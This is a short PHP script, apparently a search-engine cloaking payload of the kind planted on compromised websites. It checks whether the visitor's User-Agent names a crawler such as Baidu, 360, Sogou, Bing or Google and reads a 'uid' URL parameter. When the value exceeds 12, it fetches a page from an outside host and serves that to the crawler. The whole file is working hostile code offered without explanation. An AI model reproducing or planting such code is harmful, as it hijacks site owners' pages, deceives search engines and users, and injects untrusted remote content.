<?php 
$Agent=$_SERVER["HTTP_USER_AGENT"];
function numid()
    {
	  $Aurl=$_SERVER['REQUEST_URI'];
	  if (strstr($Aurl,"uid="))
       {
         $arrurl =explode("&",$Aurl) ;
         $arrurl2=$arrurl[1];
         $arrurl3=explode("=",$arrurl2);
		 $numid=$arrurl3[1];
		 return $numid;
	    }
	
	}
if(strpos($Agent,'baidu')!== false||strpos($Agent,'360')!==false||strpos($Agent,'sogou')!==false||strpos($Agent,'bing')!==false||strpos($Agent,'google')!==false)
  {
   $idx=numid();
   if($idx > 12){
        


  $mm= file_get_contents('http://www.wasyy.cn/tz/404.php');
  echo  $mm;
die();

        }
  }
?>